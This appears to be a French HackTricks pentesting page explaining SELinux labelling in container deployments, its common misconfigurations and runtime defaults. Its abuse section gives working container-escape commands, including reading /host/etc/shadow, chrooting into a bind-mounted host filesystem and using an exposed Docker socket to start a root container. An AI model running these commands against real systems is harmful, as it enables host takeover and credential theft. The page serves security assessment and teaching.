# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Présentation

SELinux est un système de **Mandatory Access Control basé sur des labels**. Chaque processus et objet pertinent peut porter un contexte de sécurité, et la policy décide quels domaines peuvent interagir avec quels types et de quelle manière. Dans les environnements conteneurisés, cela signifie généralement que le runtime lance le processus du conteneur sous un domaine container confiné et étiquette le contenu du conteneur avec les types correspondants. Si la policy fonctionne correctement, le processus pourra lire et écrire les éléments que son label est censé toucher tout en se voyant refuser l'accès à d'autres contenus de l'hôte, même si ces contenus deviennent visibles via un mount.

C'est l'une des protections côté hôte les plus puissantes disponibles dans les déploiements Linux conteneurisés grand public. Elle est particulièrement importante sur Fedora, RHEL, CentOS Stream, OpenShift et d'autres écosystèmes centrés sur SELinux. Dans ces environnements, un évaluateur qui ignore SELinux comprendra souvent mal pourquoi une voie d'attaque apparemment évidente vers la compromission de l'hôte est en réalité bloquée.

## AppArmor Vs SELinux

La différence la plus simple à haut niveau est qu'AppArmor est basé sur les chemins tandis que SELinux est **basé sur des labels**. Cela a de grandes conséquences pour la sécurité des conteneurs. Une policy basée sur les chemins peut se comporter différemment si le même contenu de l'hôte devient visible sous un chemin de mount inattendu. Une policy basée sur les labels demande plutôt quel est le label de l'objet et ce que le domaine du processus peut lui faire. Cela ne rend pas SELinux simple, mais le rend robuste face à une classe d'hypothèses de contournement par chemin que les défenseurs font parfois par accident dans les systèmes basés sur AppArmor.

Parce que le modèle est orienté labels, la gestion des volumes de conteneurs et les décisions de relabeling sont critiques pour la sécurité. Si le runtime ou l'opérateur change les labels trop largement pour "make mounts work", la frontière de policy qui était supposée contenir la charge de travail peut devenir bien plus faible que prévu.

## Laboratoire

Pour vérifier si SELinux est actif sur l'hôte :
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Pour inspecter les étiquettes existantes sur l'hôte :
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Pour comparer une exécution normale avec une où le labeling est désactivé :
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Sur un hôte avec SELinux activé, c'est une démonstration très concrète car elle montre la différence entre une charge de travail s'exécutant sous le domaine de conteneur attendu et une autre dont cette couche d'application a été retirée.

## Utilisation à l'exécution

Podman s'aligne particulièrement bien avec SELinux sur les systèmes où SELinux fait partie des paramètres par défaut de la plateforme. Rootless Podman plus SELinux constitue l'un des socles de sécurité des conteneurs les plus robustes et répandus, car le processus est déjà non privilégié côté hôte et reste confiné par la politique MAC. Docker peut aussi utiliser SELinux lorsque c'est pris en charge, bien que les administrateurs le désactivent parfois pour contourner les frictions de labellisation des volumes. CRI-O et OpenShift s'appuient fortement sur SELinux dans leur modèle d'isolation des conteneurs. Kubernetes peut également exposer des paramètres liés à SELinux, mais leur utilité dépend évidemment du fait que le système d'exploitation du nœud prenne réellement en charge et applique SELinux.

La leçon récurrente est que SELinux n'est pas un simple ornement facultatif. Dans les écosystèmes construits autour de lui, il fait partie de la frontière de sécurité attendue.

## Mauvaises configurations

L'erreur classique est `label=disable`. Opérationnellement, cela survient souvent parce qu'un montage de volume a été refusé et que la solution la plus rapide à court terme a été de retirer SELinux de l'équation plutôt que de corriger le modèle de labellisation. Une autre erreur fréquente est une relabellisation incorrecte du contenu de l'hôte. Des opérations de relabellisation larges peuvent faire fonctionner l'application, mais elles peuvent aussi étendre ce que le conteneur est autorisé à toucher bien au-delà de l'intention initiale.

Il est aussi important de ne pas confondre SELinux **installé** et SELinux **effectif**. Un hôte peut prendre en charge SELinux et être néanmoins en mode permissif, ou le runtime peut ne pas lancer la charge de travail sous le domaine attendu. Dans ces cas, la protection est bien plus faible que ce que la documentation pourrait laisser croire.

## Abus

Quand SELinux est absent, en mode permissif, ou largement désactivé pour la charge de travail, les chemins montés depuis l'hôte deviennent beaucoup plus faciles à exploiter. Le même bind mount qui aurait autrement été contraint par des labels peut devenir une voie directe vers les données de l'hôte ou la modification de l'hôte. Cela est particulièrement pertinent lorsqu'il est combiné avec des montages de volumes en écriture, des répertoires du runtime du conteneur, ou des raccourcis opérationnels qui exposent des chemins sensibles de l'hôte par commodité.

SELinux explique souvent pourquoi un breakout writeup générique fonctionne immédiatement sur un hôte mais échoue à répétition sur un autre alors que les flags du runtime semblent similaires. L'ingrédient manquant n'est fréquemment ni un namespace ni une capability, mais une frontière de labels qui est restée intacte.

Le contrôle pratique le plus rapide consiste à comparer le contexte actif puis à sonder les chemins montés de l'hôte ou les répertoires du runtime qui seraient normalement confinés par les labels :
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Si un bind mount de l'hôte est présent et que l'étiquetage SELinux a été désactivé ou affaibli, la divulgation d'informations survient souvent en premier :
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Si le mount est writable et que le container est effectivement host-root du point de vue du kernel, l'étape suivante est de tester une modification contrôlée du host plutôt que de deviner :
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Sur des hôtes compatibles avec SELinux, la perte des labels autour des répertoires d'état d'exécution peut également exposer des chemins directs de privilege-escalation :
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Ces commandes ne remplacent pas une escape chain complète, mais elles permettent de savoir très rapidement si SELinux était ce qui empêchait l'accès aux données de l'hôte ou la modification de fichiers côté hôte.

### Exemple complet : SELinux désactivé + montage hôte en écriture

Si le labeling SELinux est désactivé et que le système de fichiers de l'hôte est monté en écriture sur `/host`, une full host escape devient un cas classique d'abus de bind-mount :
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Si le `chroot` réussit, le processus du conteneur fonctionne désormais depuis le système de fichiers de l'hôte :
```bash
id
hostname
cat /etc/passwd | tail
```
### Exemple complet : SELinux désactivé + répertoire runtime

Si le workload peut atteindre un socket runtime une fois les labels désactivés, l'évasion peut être déléguée au runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
L'observation pertinente est que SELinux constituait souvent le mécanisme empêchant précisément ce type d'accès host-path ou runtime-state.

## Vérifications

L'objectif des vérifications SELinux est de confirmer que SELinux est activé, d'identifier le contexte de sécurité actuel et de vérifier si les fichiers ou chemins qui vous intéressent sont effectivement confinés par des labels.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Ce qui est intéressant ici :

- `getenforce` devrait idéalement renvoyer `Enforcing` ; `Permissive` ou `Disabled` change le sens de toute la section SELinux.
- Si le contexte du processus actuel semble inattendu ou trop large, la charge de travail peut ne pas s'exécuter sous la politique de conteneur prévue.
- Si les fichiers montés depuis l'hôte ou les répertoires runtime ont des labels auxquels le processus peut accéder trop librement, les bind mounts deviennent beaucoup plus dangereux.

Lors de l'examen d'un conteneur sur une plateforme compatible SELinux, ne considérez pas l'étiquetage comme un détail secondaire. Dans de nombreux cas, c'est l'une des principales raisons pour lesquelles l'hôte n'est pas déjà compromis.

## Paramètres d'exécution par défaut

| Runtime / platform | État par défaut | Comportement par défaut | Affaiblissements manuels courants |
| --- | --- | --- | --- |
| Docker Engine | Dépendant de l'hôte | La séparation SELinux est disponible sur les hôtes avec SELinux activé, mais le comportement exact dépend de la configuration de l'hôte/du daemon | `--security-opt label=disable`, réétiquetage massif des bind mounts, `--privileged` |
| Podman | Généralement activé sur les hôtes SELinux | La séparation SELinux fait normalement partie de Podman sur les systèmes SELinux, sauf si désactivée | `--security-opt label=disable`, `label=false` dans `containers.conf`, `--privileged` |
| Kubernetes | Pas généralement attribué automatiquement au niveau du Pod | Le support SELinux existe, mais les Pods nécessitent généralement `securityContext.seLinuxOptions` ou des valeurs par défaut spécifiques à la plateforme ; le runtime et le support du nœud sont requis | options `seLinuxOptions` faibles ou larges, exécution sur des nœuds permissifs/désactivés, politiques de plateforme qui désactivent l'étiquetage |
| CRI-O / OpenShift style deployments | Souvent fortement utilisées | SELinux est souvent une composante centrale du modèle d'isolation des nœuds dans ces environnements | politiques personnalisées qui élargissent excessivement les accès, désactivation de l'étiquetage pour compatibilité |

Les valeurs par défaut de SELinux dépendent davantage de la distribution que celles de seccomp. Sur les systèmes de type Fedora/RHEL/OpenShift, SELinux est souvent central au modèle d'isolation. Sur les systèmes sans SELinux, il est simplement absent.
{{#include ../../../../banners/hacktricks-training.md}}
